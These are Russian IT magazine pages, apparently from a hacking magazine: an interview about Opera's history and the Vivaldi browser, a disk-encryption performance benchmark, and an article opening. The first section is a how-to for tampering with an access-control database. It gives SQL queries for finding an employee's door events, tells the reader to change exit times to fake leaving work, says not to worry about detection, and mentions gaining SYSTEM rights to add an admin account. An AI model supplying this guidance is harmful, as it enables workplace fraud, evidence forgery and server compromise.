СОЗДАНИЕ ЛОЖНЫХ СОБЫТИЙ СКУД
Давай попробуем разыграть самый безобидный сценарий — подправим себе
время посещения. Для начала нужно по ФИО получить ID пользователя, поэ-
тому делаем SQL запрос к серверу:

select * from fb_usr where LNAME=’Фамилия’

В ответ получим строчку из БД, где должен быть написан наш идентификатор
внутри системы, он обычно цифровой. Если из БД придет ответ в несколько
строчек, то ты должен понять по косвенным признакам, то есть по остальным
колонкам результата, какая соответствует твоему пользователю.
Теперь, зная свой идентификатор (допустим, это 123), заглянем в таблицу, веду-
щую учет открытия-закрытия дверей: fb_evn. Здесь исполняем второй запрос,
который выведет нам все события, связанные с нашей картой-пропуском:

select * from fb_evn where USR=(select ID from fb_usr where ID=123)





Рис. 10. Конечный SQL-запрос

Вот, собственно, почти все. Заметь, каждый проход через дверь — это два со-
бытия: открытие и закрытие двери при проходе. Если речь о входе в контроли-
руемую зону, то это события 2 и 3, если о выходе — события 4 и 5.





Рис. 11. Проходы выбранного сотрудника
Чтобы сымитировать выход через дверь, находим факт выхода через внешнюю
дверь компании и меняем для этих двух строчек время на то, когда ты хочешь/
должен «уйти» (см. рисунок 12).





Рис. 12. Подмена времени ухода с работы

Обнаружить такую махинацию можно: в базе данных номер подмененного со-
бытия будет выбиваться из хронологического порядка, но такую замену можно
заметить только при прямом подключении к БД и скрупулезном поиске, так что
вообще не волнуйся по этому поводу. А если есть удаленный доступ к своему
рабочему месту, то правки можно вносить и извне организации.

Выполнение команд с правами SYSTEM

Также стоит упомянуть, что через пользователя SYSDBA можно выполнять
комманды ОС с правами SYSTEM. Например, можно добавить новую учетную
запись администратора всего сервера и залогиниться на него со всеми выте-
кающими из этого последствиями. Подробнее можно почитать тут или посмо-
треть здесь.
ИНТЕРВЬЮ





                                                                         Беседовал
                                                                    Андрей Письменный

ПЯТЬ ЛЕТ
В «ОПЕРЕ»
ИЛЬЯ ШПАНЬКОВ
О ПРОШЛОМ OPERA
И БУДУЩЕМ VIVALDI
Любимый многими браузер Opera поделился надвое: его
создатель Йон фон Тэчнер с группой единомышленников
делает новый продукт — Vivaldi, а Opera тем временем пере-
ходит во владение китайской фирмы Qihoo. О том, какие со-
бытия привели к этой ситуации, рассказывает Илья Шпань-
ков. Он работал в Opera Software менеджером по развитию
в России и СНГ, а теперь перешел в команду Vivaldi.


Рассказ о моем пути к работе в норвежском офисе Opera Software — это долгая
и любопытная история. Началось все в 2003 году, когда вышла Opera 7. Я в то вре-
мя перешел на использование GNU/Linux и как раз подбирал приложения, наилуч-
шим образом подходящие для работы в сети. И «семерка» оказалась тем браузе-
ром, который обладал необходимыми мне качествами — она была миниатюрной,
быстрой, функциональной и удобной. Еще одним плюсом оказался текстовый
формат конфигурационных файлов, в частности, файла локализации. Моим хобби
тогда был перевод интерфейса программ на русский язык. Собственно, первая
моя «работа» в пользу Opera Software и заключалась в подготовке неофициальных
версий перевода браузера и размещение их в интернете для всех пользователей
Opera. Правда, в самой Opera Software об этом тогда даже не догадывались.





Opera 7 и MyOpera.net
Влившись   в   сообщество   пользователей   норвежского   браузера
на MyOpera.net — самом популярном тогда неофициальном веб-сайте под-
держки Opera, я начал активно помогать другим пользователям в решении
проблем и в освоении многочисленных функций браузера. А в июне 2003
года произошло знаменательное событие — мы, русскоязычные пользовате-
ли Opera, отправили в компанию открытое письмо от лица сообщества.
  Дело в том, что в то время в интерфейсе браузера присутствовал реклам-
ный баннер, убрать который можно, только купив лицензию за 39 долларов.
Или взломав программу. Что, собственно, большинство российских пользо-
вателей и делали. При этом число желающих отблагодарить разработчиков
финансово и стать пользователями легальной версии браузера было доста-
точно велико. Но не за такие по тем временам огромные деньги. Наше письмо
содержало некоторые предложения о том, как мы, сообщество пользователей
Opera, готовы попробовать помочь решить эту проблему.
   Ровно через три месяца, в сентябре, я получил ответ от директора компа-
нии, Йона фон Тэчнера, в котором он высказал большую заинтересованность
в нашей совместной работе. С этого момента я стал волонтером — добро-
вольным помощником компании на российском рынке. Занимался маркетин-
говыми исследованиями, организацией пресс-туров (первый визит в Россию
Йон со своим заместителем совершили в 2005 году), и, конечно, проработкой
лицензионной политики компании для России и СНГ. Идей было много, самых
разных, и особенно приятно, что именно наш вариант рассматривался в ком-
пании для четырех стран — России, Китая, Бразилии и Индии.





Йон фон Тэчнер
Одновременно мы проводили различные акции, вроде «две Оперы по цене
одной» или раздачи бесплатных регистрационных ключей к юбилею компа-
нии в августе 2005 года, а с сентября того же года браузер Opera, доросший
до версии 8.5, стал полностью бесплатным для персонального использова-
ния. Таким образом, можно сказать, что активность российского сообщества
пользователей сыграла не последнюю роль в бесплатном распространении
браузера по всему миру.
  В дальнейшем я помогал компании как в маркетинге, так и в организа-
ции различных мероприятий в России, при этом продолжая активную работу
в сообществе пользователей. К середине 2008 года доля Opera на россий-
ском рынке выросла до 20% (с 5% в 2003 году). И в августе этого же года я
стал штатным сотрудником компании. Поначалу работал из дома, а в 2009
году уехал в Норвегию, в головной офис компании. Правда, с единственной
целью: готовить открытие российского офиса Opera. Что мы успешно и сде-
лали в январе 2010 года, открыв первое представительство в Санкт-Петер-
бурге. Я, естественно, вернулся в Россию, чтобы продолжить работу уже
в российском филиале компании. К этому времени доля Opera на россий-
ском рынке достигла 35% — это наивысший показатель за всю историю
браузера.
   Если вспоминать годы работы в Норвегии, то самое первое и яркое впе-
чатление — знакомство с уникальными людьми. Opera по праву считалась ин-
новационным браузером, именно в ней впервые появлялись многие функции,
впоследствии ставшие эталонами для всех браузеров. Когда начинаешь рабо-
тать в одной компании с теми людьми, которые все придумали и реализовали,
это очень вдохновляет. И, естественно, знакомство с Йоном фон Тэчнером (мы
дружим уже более 10 лет), с Хоконом Ли — с людьми уникальными, необыч-
ными, неординарными. Оказавшись рядом с ними, вдруг понимаешь, что мир
меняют не небожители, а такие же люди, как ты сам, и это заставляет поверить
в свои силы. В то, что и ты можешь внести свой вклад в изменение мира к луч-
шему, в создание продукта, которым будут пользоваться десятки и сотни мил-
лионов людей. А когда твои идеи реализуются в новой версии уже в качестве
готовой функции — это просто здорово.
  В компании меня больше всего поразило то, что это не была просто
группа людей, работающих за зарплату в одном помещении — это было
реальное сообщество единомышленников, где каждый на своем месте
болел душой за конечный результат и принимал участие в развитии брау-
зера. Стоит отметить, что зарплаты в компании были даже немного ниже,
чем в среднем в норвежском софтверном бизнесе, но, повторю, люди ра-
ботали не за зарплату — им просто нравилось то, что они делают. Запом-
нилась и очень дружественная, почти домашняя атмосфера в офисе. Там
было очень уютно. На одном из этажей даже была специальная спальная
комната, где любой желающий мог вздремнуть часок после обеда, если
в этом была необходимость. Особое восхищение гостей офиса вызывали
«детские кабинеты» — в одной половине кабинета размещалась игровая
комната с массой игрушек, а за стеклянной перегородкой стояли рабочие
столы, где родитель мог продолжать трудиться, постоянно держа в поле
зрения своего ребенка.
  Были и забавные моменты. Например, с 2003 года я постоянно общался
с одним из менеджеров компании по имени Дивиша Чандна. И почему-то я
всегда думал, что это некий индийский специалист, поэтому и стиль общения
с ним у меня был соответствующий — мужской. А через три года я впервые
посетил норвежский офис и при личном знакомстве с удивлением обнаружил,
что Дивиша — это очень красивая молодая индийская девушка. Но самое за-
бавное то, что она, в свою очередь, все три года принимала меня за россий-
скую девушку, считая имя «Ilya» женским из-за окончания на гласную. В об-
щем, посмеялись оба над своими заблуждениями от души. А я с того момента
всегда проверял фотографию сотрудника прежде, чем начать с ним деловую
переписку.
   Тех изменений, что привели к смене курса компании, ни тогда, ни в момент
моего возвращения в Россию (2010 год) я не замечал. Вся интрига разворачи-
валась на уровне пайщиков-акционеров компании и стала публичной в 2004
году. Первым «звоночком» было смещение Йона фон Тэчнера в январе 2010
года с поста руководителя компании, который он занимал 15 лет, с первого
дня основания Opera Software. Как сказал сам Йон, он покинул свой пост из-за
разногласий с советом директоров в вопросах дальнейшей стратегии компа-
нии.
   Суть этих разногласий стала понятна уже к концу 2010 года: постепенно
все меньше внимания уделялось собственно браузеру, а основной упор был
сделан на повышение прибыльности. В мобильных версиях Opera стали появ-
ляться рекламные баннеры, в десктопной внедрялись новшества, которые от-
вечали не интересам пользователей, а интересам партнеров. При этом раз-
витие существующих функций постепенно сворачивалось вплоть до удаления
из браузера.
   То, что можно было продать — продавали (так, например, в «Яндекс.Брау-
зере» появилась технология Turbo), а то, что не продавалось — просто выбра-
сывалось из браузера. Именно так поступили с Opera Unite — очень перспек-
тивной технологией, позволявшей браузерам пользователей обмениваться
информацией в режиме Peer-to-Peer.
Opera 12 — последняя «классическая» версия на ядре Presto

Естественно, у пользователей накапливалось недовольство, доля браузера
на российском рынке начала снижаться. К концу 2012 года у руководства ком-
пании появилась идея кардинально снизить затраты на разработку браузера,
сместив фокус на его монетизацию. Таким решением стал отказ от разработ-
ки собственного движка и переход на WebKit (а чуть позже — на его форк Blink).
  Для той компании, которая существовала до 2010 года, отказ от своего
движка являлся, на мой взгляд, огромной, фатальной ошибкой. Прошло уже
шесть лет, а пользователи до сих пор ностальгируют по прежнему браузеру,
а с недавнего времени уже смотрят на Vivaldi и торопят нас вернуть все то, что
было в «классической» Опере. Сделать это на чужом движке не всегда просто,
но со временем вернем все и даже добавим много нового.
  А вот для Opera Software образца «после ухода Йона» отказ от своего движ-
ка стал шагом неизбежным и закономерным. Сама стратегия была направле-
на именно на максимальное снижение себестоимости процесса разработки
в целях получения дополнительных прибылей. Эти прибыли пускались на за-
купки других компаний, в основном, рекламного направления. Скажем так,
в цепочке «пользователи — браузер — деньги» среднее звено оказалось лиш-
ним. Поэтому от него и избавились.
   Руководство понимало, что в компании много сотрудников, которым эта
идея не понравится. Поэтому во всех отделах в конце 2012 года прошел пер-
сональный опрос на тему «как ты относишься к идее перейти на WebKit». Мое
мнение было однозначным — такой шаг равносилен убийству браузера, что я
и изложил своему начальнику, попытавшись сделать это аргументированно.
К сожалению, решение уже было принято и никто не ждал аргументов — шла
обычная проверка на лояльность, которую я не прошел.
  Кроме того, к этому моменту работа в компании перестала приносить мне
радость: общение с сообществом пользователей подразумевает искренность
и твердую убежденность в том, что ты делаешь все правильно. Любую фальшь
люди сразу распознают и соответственно меняют свое отношение как к чело-
веку, который ее допустил, так и к собственно продукту, который этот чело-
век предлагает. А по долгу службы мне приходилось оптимистично объявлять
о новшествах, которые на самом деле никаких преимуществ пользователям
не давали, а были направлены лишь на повышение доходности браузера. Поте-
ря доверия — это, пожалуй, самое неприятное, что может произойти с сотруд-
ником, который является лицом компании для многочисленных пользователей.
   Закончилось все тем, что в январе 2013 года всем сотрудникам, не соглас-
ным с новой политикой руководства, было предложено добровольно растор-
гнуть трудовой договор, что я и сделал, покинув компанию 1 февраля 2013
года. А 13 февраля был объявлен переход на WebKit. С этого момента почти
десятилетняя история моей «Оперы» закончилась и началась совсем другая.
   Грядущий переход Opera под крыло китайской Qihoo 360 — это для меня,
безусловно, печальное известие. Но при этом — закономерное. Когда руко-
водство начинает делать деньги, а не продукт, именно деньги и становятся ко-
нечной целью. Поэтому для совета директоров компании не имеет значения,
что происходит с браузером и какую роль он играет в индустрии, они сначала
выжимают максимум из монетизации, а затем продают то, что осталось от про-
дукта. Цель достигнута, капиталы приумножены, можно вкладывать получен-
ные барыши в другие проекты.
  В одном из недавних интервью Йон фон Тэчнер очень точно подметил: ком-
панию Opera Software не купили — ее продали. И он прав. Одно дело, когда
ты развиваешь успешный проект и тебе предлагают за него деньги, и совсем
другое, когда ты сам ищешь покупателя. Второй вариант означает, что вла-
дельцы не видят будущего своего продукта и избавляются от него. Ни о каком
развитии, естественно, тут говорить не приходится. Что планируют сделать
с браузером новые владельцы — покажет время. Возможно, он сумеет повто-
рить историю успеха ноутбуков Lenovo (в прошлом IBM ThinkPad), но высока
вероятность и того, что всем нам известный браузер Opera исчезнет на бес-
крайних просторах китайского рынка.
  Я же с конца 2013 года работаю в новой компании, которая разрабатывает
браузер Vivaldi. Он стал новым детищем Йона фон Тэчнера, который давно по-
нял, к чему придет Opera после его ухода из компании. Естественно, в первую
очередь мы пытаемся как можно скорее вернуть пользователям те «оперные»
функции, которые были утрачены вместе с отказом от движка Presto разра-
ботчиков Opera, но, соблюдая хорошую традицию, мы стараемся идти в ногу
со временем и добавляем новые функции, ранее не существовавшие в брау-
зерах. Пока это не очень заметные новшества, но у нас большие планы.





Браузер Vivaldi — наследник традиций «классической» Opera

От современного варианта браузера Opera нас отличает главное: мы созда-
ем браузер для пользователей и опираясь на запросы пользователей, так-
же активно вовлекая их в собственно процесс разработки. Пример «класси-
ческого» периода Opera показал, что только таким образом можно создать
действительно популярный, качественный продукт. Наша цель — не деньги,
а браузер.
   Иногда меня спрашивают, почему Vivaldi в таком случае не распространяет-
ся под свободной лицензией. Ответ прост: проприетарность Vivaldi обусловле-
на самим процессом разработки. При разработке свободного продукта роль
сотрудников компании зачастую сводится к управлению многочисленными
правками, присылаемыми сторонними программистами, при этом собственно
на творчество времени не остается. Было бы неразумно отказываться от по-
тенциала своих разработчиков, заставляя их собирать конечный продукт по ку-
сочкам из чужого кода. При этом те изменения, что мы вносим в код Chromium,
на котором основан наш браузер, мы возвращаем в сообщество под той же
свободной лицензией.





Что до планов монетизации, то они уже реализуются. В частности, в русско-
язычной версии браузера уже есть партнерские ссылки Яндекса, OZON.ru,
AliExpress, от нескольких игровых проектов. Пока, естественно, доходы не-
большие, но с ростом числа пользователей будет расти и прибыль.
   Сегодня в компании работает 35 человек, треть из них — бывшие сотрудни-
ки Opera Software. У нас три офиса — в Норвегии, в Исландии и в США. Прак-
тически вся команда подбиралась лично Йоном — он пригласил в компанию
тех людей, опыт и квалификацию которых знал лично. В целом коллектив очень
профессиональный, что подтверждается и результатами работы за прошлый
год. Даже с такой немногочисленной командой мы смогли сделать гораздо
больше, чем когда-то делала за год компания Opera Software, насчитывавшая
несколько сотен сотрудников.
   Также мы пытаемся сохранить ту «семейную» атмосферу, что была в ком-
пании Opera когда-то. Коллектив очень дружный, часто мы собираемся все
вместе в одном из офисов, летом — даже с семьями, проводим вместе
не только рабочие дни, но и выходные, выезжая на природу, которая в той
же Исландии уникальна. Также исландские коллеги «заразили» меня зим-
ним плаванием в океане и в феврале я установил своеобразный личный ре-
корд: поплавал несколько раз в воде с температурой минус 2°. Ощущения
незабываемые.





Малочисленность сотрудников накладывает свой отпечаток на распределение
обязанностей. В частности, я сейчас отвечаю за маркетинг в России и СНГ, одно-
временно занимаюсь партнерствами с различными компаниями, также на мне
процесс управления локализацией браузера (наша команда добровольных пе-
реводчиков насчитывает сегодня около 200 человек из 35 стран), ну и работу
с сообществом пользователей тоже никто не отменял, причем не только с рос-
сийским, но и из других стран. Могу сказать, что с первого дня существования
браузера русскоязычная аудитория — самая многочисленная. Естественно,
как и любой сотрудник компании Vivaldi Technologies, я тестирую новые сборки,
отправляю баг-репорты, предлагаю идеи об улучшении браузера.
  Ближайшее будущее браузера Vivaldi — выпуск первой стабильной версии.
Именно на это нацелена команда сегодня. А дальше — продолжение разра-
ботки без снижения темпов. Очень многое еще в планах, как из «старых» функ-
ций, так и из новых. Если говорить о рыночной доле, то пока прогнозы делать
рано. Наша главная цель — делать браузер, который подойдёт и начинающим,
и опытным пользователям. Поэтому мы и дальше будем работать в тесном со-
трудничестве с теми, кому Vivaldi пришелся по вкусу. Мы уверены, что только
таким образом можно создавать действительно хороший браузер, способный
предоставить пользователям максимум возможностей по работе в сети.
   Конкурировать с гигантами индустрии сложно, но можно: опыт «классиче-
ской» Оперы тому подтверждение. Главное — быть честными со своими поль-
зователями. И мы уверены, что сможем оставаться такими все время.
PC ZONE
ШИФРОВАНИЕ
И СКОРОСТЬ
СРАВНИТЕЛЬНЫЙ ТЕСТ СРЕДСТВ
ШИФРОВАНИЯ ДИСКА





                                                                         Денис Колисниченко
                                                                                                 dhsilabs@gmail.com
Существует масса причин зашифровать данные на сво-
ем жестком диске, но расплатой за безопасность данных
будет снижение скорости работы системы. Цель этой ста-
тьи — сравнить производительность при работе с диском,
зашифрованным разными средствами.

Чтобы разница была более драматичной, мы выбрали не суперсовременную,
а среднестатистическую машину. Обычный механический хард на 500 Гбайт,
двухъядерный AMD на 2,2 ГГц, 4 гига оперативки, 64-битная Windows 7 SP 1.
Никаких антивирусов и прочих программ во время теста запущено не будет,
чтобы ничто не смогло повлиять на результаты.
  Для оценки производительности я выбрал CrystalDiskMark. Что до тестируе-
мых средств шифрования, то я остановился на таком списке: BitLocker, TrueCrypt,
VeraCrypt, CipherShed, Symantec Endpoint Encryption и CyberSafe Top Secret.

BITLOCKER
Это стандартное средство шифрования дисков, встроенное в Microsoft
Windows. Многие просто используют его, не устанавливая сторонних про-
грамм. Действительно, зачем, если все уже есть в системе? С одной стороны,
правильно. С другой стороны, код закрыт, и нет уверенности, что в нем не оста-
вили бэкдоров для ФБР и прочих интересующихся.
  Шифрование диска осуществляется по алгоритму AES с длиной ключа 128
или 256 бит. Ключ при этом может храниться в Trusted Platform Module, на са-
мом компьютере или на флешке.
   Если используется TPM, то при загрузке компьютера ключ может быть полу-
чен сразу из него или после аутентификации. Авторизоваться можно при по-
мощи ключа на флешке или введя PIN-код с клавиатуры. Комбинации этих ме-
тодов дают множество вариантов для ограничения доступа: просто TPM, TPM
и USB, TPM и PIN или все три сразу.
   У BitLocker есть два неоспоримых преимущества: во-первых, им можно
управлять через групповые политики; во-вторых, он шифрует тома, а не фи-
зические диски. Это позволяет зашифровать массив из нескольких дисков,
чего не умеют делать некоторые другие средства шифрования. Также BitLocker
поддерживает GUID Partition Table (GPT), чем не может похвастаться даже
наиболее продвинутый форк «Трукрипта» VeraCrypt. Чтобы зашифровать с его
помощью системный GPT-диск, придется сначала конвертировать в формат
MBR. В случае с BitLocker это не требуется.
  В целом, недостаток один — закрытые исходники. Если ты хранишь секре-
ты от домочадцев, BitLocker отлично подойдет. Если же твой диск забит доку-
ментами государственной важности, лучше подыскать что-то другое.
Можно ли расшифровать BitLocker и TrueCrypt

Если попросить Google, то он найдет интересную программу Elcomsoft Forensic
Disk Decryptor, пригодную для расшифровки дисков BitLocker, TrueCrypt и PGP.
В рамках этой статьи испытывать ее не стану, но поделюсь впечатлениями
о другой утилите от Elcomsoft, а именно Advanced EFS Data Recovery. Она пре-
восходно расшифровывала EFS-папки, но при условии, что пароль пользо-
вателя не был задан. Если задать пароль хоть 1234, программа оказывалась
бессильной. Во всяком случае, расшифровать зашифрованную EFS-папку,
принадлежащую пользователю с паролем 111, у меня не получилось. Думаю,
с продуктом Forensic Disk Decryptor ситуация будет такой же.



TRUECRYPT
Это легендарная программа шифрования дисков, разработка которой была
прекращена в 2012 году. История, которая приключилась с TrueCrypt, до сих
пор покрыта мраком, и толком никто не знает, почему разработчик решил от-
казаться от поддержки своего детища.
   Есть лишь крупицы информации, не позволяющие сложить пазл воеди-
но. Так, в 2013 году начался сбор средств для проведения независимого ауди-
та TrueCrypt. Причиной прослужила полученная от Эдварда Сноудена инфор-
мация о намеренном ослаблении средств шифрования TrueCrypt. На аудит
было собрано свыше 60 тысяч долларов. В начале апреля 2015 года работы были
завершены, но никаких серьезных ошибок, уязвимостей или других существен-
ных недостатков в архитектуре приложения выявлено не было.
   Как только закончился аудит, TrueCrypt снова оказался в центре скандала.
Специалисты компании ESET опубликовали отчет о том, что русскоязычная
версия TrueCrypt 7.1a, загруженная с сайта truecrypt.ru, содержала малварь.
Более того, сам сайт truecrypt.ru использовался как командный центр —
с него отправлялись команды инфицированным компьютерам. В общем, будь
бдителен и не скачивай программы откуда попало.
  К преимуществам TrueCrypt можно отнести открытые исходники, надеж-
ность которых теперь подкреплена независимым аудитом, и поддержку ди-
намических томов Windows. Недостатки: программа больше не развивается,
и разработчики не успели реализовать поддержку UEFI/GPT. Но если цель —
зашифровать один несистемный диск, то это неважно.
  В отличие от BitLocker, где поддерживается только AES, в TrueCrypt есть еще
Serpent и Twofish. Для генерации ключей шифрования, соли и ключа заголовка
программа позволяет выбрать одну из трех хеш-функций: HMAC-RIPEMD-160,
HMAC-Whirlpool, HMAC-SHA-512. Однако о TrueCrypt уже
много чего было написано, так что не будем повторяться.

VERACRYPT
Наиболее продвинутый клон TrueCrypt. У него собствен-
                                                         INFOный формат, хотя есть возможность работы в режиме
TrueCrypt, в котором поддерживаются зашифрованные        Самоустранив-
и виртуальные диски в формате «Трукрипта». В отличие        шись, TrueCrypt
                                                                              оставил богатое на-от CipherShed, VeraCrypt может быть установлена на один                                                                                следие: у него мно-
и тот же компьютер одновременно с TrueCrypt.                                                                            жество форков, на-
  В TrueCrypt используется 1000 итераций при генера-       чиная с VeraCrypt,
                                                                                 CipherShedции ключа, которым будет зашифрован системный раздел,
                                                                          и DiskCryptor.
а VeraCrypt использует 327 661 итерацию. Для стандарт-
ных (не системных) разделов VeraCrypt использует 655
331 итерацию для хеш-функции RIPEMD-160 и 500 000 итераций для SHA-2
и Whirlpool. Это делает зашифрованные разделы существенно более устойчи-
выми к атаке прямым перебором, но и значительно снижает производитель-
ность работы с таким разделом. Насколько значительно, мы скоро выясним.
  Среди преимуществ VeraCrypt — открытый исходный код, а также соб-
ственный и более защищенный по сравнению с TrueCrypt формат виртуальных
и зашифрованных дисков. Недостатки те же, что и в случае с прародителем, —
отсутствие поддержки UEFI/GPT. Зашифровать системный GPT-диск по-преж-
нему нельзя, но разработчики уверяют, что работают над этой проблемой
и скоро такое шифрование будет доступно. Вот только работают они над этим
уже два года (с 2014-го), и когда будет релиз с поддержкой GPT и будет ли он
вообще, пока не известно.

CIPHERSHED
Еще один клон TrueCrypt. В отличие от VeraCrypt, он использует исходный фор-
мат TrueCrypt, поэтому можно ожидать, что его производительность будет
близка к производительности TrueCrypt.
  Преимущества и недостатки все те же, хотя к недостаткам можно еще доба-
вить невозможность установки TrueCrypt и CipherShed на одном компьютере.
Мало того, если попытаться установить CipherShed на машину с уже установ-
ленным TrueCrypt, то инсталлятор предлагает удалить предыдущую програм-
му, но не справляется с задачей.

SYMANTEC ENDPOINT ENCRYPTION
В 2010 году компания Symantec выкупила права на программу PGPdisk. В ре-
зультате появились такие продукты, как PGP Desktop и, впоследствии, Endpoint
Encryption. Именно ее мы и рассмотрим. Программа, конечно же, проприетар-
ная, исходники закрыты, и одна лицензия стоит 64 евро. Зато тут есть под-
держка GPT, но только начиная с Windows 8.
   Другими словами, если нужна поддержка GPT и есть желание зашифро-
вать системный раздел, то придется выбирать между двумя проприетарны-
ми решениями: BitLocker и Endpoint Encryption. Вряд ли, конечно, домашний
пользователь будет устанавливать Endpoint Encryption. Проблема в том, что
для этого требуется Symantec Drive Encryption, для установки которого нужны
агент и сервер управления Symantec Endpoint Encryption (SEE), а сервер хочет
поставить еще и IIS 6.0. Не многовато ли всякого добра ради одной програм-
мы для шифрования диска? Мы прошли через все это только ради того, чтобы
замерить производительность.

МОМЕНТ ИСТИНЫ
Итак, приступаем к самому интересному, а именно к тестированию. Первым
делом нужно проверить производительность диска без шифрования. Нашей
«жертвой» будет раздел жесткого диска (обычного, не SSD) размером 28 Гбайт,
отформатированный как NTFS.
  Открываем CrystalDiskMark, выбираем количество проходов, размер вре-
менного файла (во всех тестах будем использовать 1 Гбпйт) и сам диск. Сто-
ит отметить, что количество проходов практически не влияет на результаты.
На первом скриншоте показаны результаты измерения производительности
диска без шифрования с числом проходов 5, на втором — с числом прохо-
дов 3. Как видишь, результаты практически идентичны, поэтому остановимся
на трех проходах.





Диск без шифрования,                    Диск без шифрования,
количество проходов 5                      количество проходов 3
Результаты CrystalDiskMark нужно трактовать так:
•  Seq Q32T1 — тест последовательной записи / последовательного чтения,
   количество очередей — 32, потоков — 1;
•  4K Q32T1 — тест случайной записи / случайного чтения (размер блока
   4 Кбайт, количество очередей — 32, потоков — 1);
•  Seq — тест последовательной записи / последовательного чтения;
•  4K — тест случайной записи / случайного чтения (размер блока 4 Кбайт);

Далее я буду ссылаться на эти тесты
по их порядку в CrystalDiskMark, то
есть Seq Q32T1 — это первый тест, 4K
Q32T1 — второй и так далее.
  Начнем с BitLocker. На шифрова-
ние раздела размером 28 Гбайт было
потрачено 19 минут.
  При  последовательном  чтении/
записи с большим количеством оче-  Процесс шифрования диска
редей результаты (первый тест) мало  при помощи BitLocker
чем отличаются от работы с незашиф-
рованным диском. Зато при обычном
последовательном чтении скорость
чтения ниже на 13 Мбайт/с, что уже
ощутимо. Остальные результаты при-
мерно такие же, как при работе с не-
зашифрованным  диском.  Отсюда
вывод, что реальная производитель-
ность зависит от алгоритма работы
программы, которая производит чте-
ние и запись. В некоторых програм-
мах разница будет совсем незаметна.
В других будет чувствоваться эффект
торможения при работе с зашифро-
ванным диском.
                                          Результаты BitLocker   Теперь  посмотрим  на  работу
TrueCrypt. Шифрование раздела за-
няло всего 9 минут, параметры были установлены по умолчанию. При шифро-
вании скорость работы с диском составила 55,4 Мбайт/с.
Настройки TrueCrypt





Скорость работы с диском, зашифрованным TrueCrypt
Результаты мало чем отличаются от пока-
зателей незашифрованного диска, только
скорость последовательной записи не-
много подкачала. На скриншоте видно, что
работа происходит с диском L — именно
к этой букве был подмонтирован зашиф-
рованный диск E:. В TrueCrypt работа с за-
шифрованным  диском  осуществляется
несколько иначе, чем в BitLocker.
  А вот результаты VeraCrypt приятно уди-
вили. Признаться честно, проводя тест, я
ожидал, что победителем будет TrueCrypt
и, возможно, результаты CipherShed ока-
                                              Результаты TrueCryptжутся на том же уровне. В VeraCrypt я
не верил — из-за того, что у этой програм-
мы собственный формат и продвинутый алгоритм шифрования. Подозревать,
что мои прогнозы окажутся неправильными, я начал еще при шифровании
диска — скорость оказалась существенно выше, чем у TrueCrypt: 65 Мбайт/с
против 55 Мбайт/с.





Шифрование диска программой VeraCrypt
Единственное, что мне не понравилось в VeraCrypt, — задержка длительно-
стью примерно в минуту перед монтированием диска. Такой задержки не было
ни в TrueCrypt, ни в CipherShed.
  А вот CipherShed оказался медлен-
нее VeraCrypt. Честно говоря, я был этим
несколько удивлен: формат у CipherShed
тот же, что и у TrueCrypt, настройки были
такие же, значит, и производительность
должна быть похожа. Но разница видна
даже на этапе шифрования раздела —
скорость составляла 43–51 Мбайт/с.





Задержка перед монтированием диска —
неприятная особенность VeraCrypt             Результаты VeraCrypt

                                                                  Результаты
                                                                    CipherShed
Параметры шифрования раздела CipherShed





Шифрование раздела в CipherShed
Осталось протестировать производи-
тельность Symantec Endpoint Security,
которая является более наворочен-
ной версией PGPDisk. В третьем тесте
производительность оказалась самой
низкой из всех протестированных про-
грамм.




                        Результат Symantec
                         Endpoint Security


СИСТЕМАТИЗИРУЕМ РЕЗУЛЬТАТЫ
Вот итоговая таблица с результатами.


                    SeqQ32T1           4K Q32T1             Seq                4K
   Приложение
                  Чтение    Запись    Чтение    Запись    Чтение    Запись    Чтение    Запись

   Без шифро-                   79,88     80,66     0,679     1,195     79,89     78,43     0,548     1,101      вания

    BitLocker     79,65    79,80    0,688    1,226    66,85    77,15    0,534    1,115
   TrueCrypt     79,81    80,65    0,551    1,151    79,65    71,51    0,539    1,133
    VeraCrypt       79,99     76,56     0,562     1,262     79,89     68,15     0,542     1,154
   CipherShed      73,52     77,05     0,551     1,096     74,04     65,84     0,536     1,139
   Symantec EE     79,86     80,13     0,666     1,134     58,93     51,80     0,507     1,115


При использовании BitLocker снижение производительности наблюдается
только в третьем тесте. В случае с TrueCrypt ощутимое снижение производи-
тельности наблюдается тоже в третьем тесте и то только при записи. Во всех
остальных случаях снижение производительности вряд ли окажется сколь-
ко-нибудь ощутимым.
   Производительность VeraCrypt, как и ожидалось, ниже, чем производитель-
ность TrueCrypt. Снижение скорости наблюдается в первом и третьем тестах.
А вот CiphedShed оказался даже медленнее, чем VeraCrypt, — тоже в первом
и третьем тестах. Symantec EE не выглядел бы аутсайдером, если бы не про-
валенный третий тест. Последовательный ввод-вывод с блоками небольшого
размера — явно не его конек.
   Однако всё это известные приложения, и все они на деле дают приемле-
мую производительность. Напоследок я решил протестировать еще одну про-
грамму — CyberSafe Top Secret. В ней используется библиотека шифрования
диска от NT Kernel и все тот же алгоритм AES. С этим приложением я уже дав-
но знаком, но, если честно, ожидал более высоких результатов. На деле это
оказался настоящий аутсайдер — на фоне его результатов даже SEE кажется
спринтером. Epic fail.





Результаты CyberSafe Top Secret

ВЫВОДЫ
Первое место по производительности разделяют TrueCrypt и BitLocker. В треть-
ем тесте скорость чтения у них ниже, чем у VeraCrypt, но зато выше скорость
записи, да и посмотри на результаты второго теста.
  На втором месте — VeraCrypt, эта программа ненамного медленнее, чем
TrueCrypt. Третье место — CipherShed, а четвертое — Symantec Endpoint
Encryption, но только из-за провала в третьем тесте. Что до CyberSafe Top
Secret, то мы о нем больше говорить не будем.
   Если нужна поддержка GPT, то я бы выбрал BitLocker. Как и SEE, BitLocker —
решение с закрытым кодом, но его стоимость уже входит в цену Windows, так
что недешевый (и к тому же тянущий за собой череду другого софта) SEE оста-
вим корпоративным пользователям.
   Однако если нужно зашифровать хранилище, а не системный диск, то мож-
но смело выбирать VeraCrypt. Да, будет чуть медленнее, чем TrueCrypt, но зато
проект развивается, и есть надежда, что и поддержка GPT появится в обозри-
мом будущем.
PC ZONE
ЯЩЕРЫ, КУЛЬТИСТЫ
                       КТО И ЗАЧЕМ
                       ДЕЛАЕТ
                       АЛЬТЕРНАТИВНЫЕИ ПРОЙДОХИ                       БРАУЗЕРЫ
                                        Олег Парамонов
                                             paramonov@sheep.ru


Мы выбрали пять необычных браузеров.
Они интересны не потому, что лучше Chrome
или Firefox. Часто — совсем наоборот.
Но для их существования всегда есть веская
причина. Кто-то не хочет бросать дело, нача-
тое четверть века назад, кто-то болеет за опе-
рационную систему, о которой забыли авторы
всех прочих браузеров, а кто-то — за мил-
лионы долларов, обещанные инвесторами
из Кремниевой долины.

Современные браузеры — это едва ли не самая сложная программа в опе-
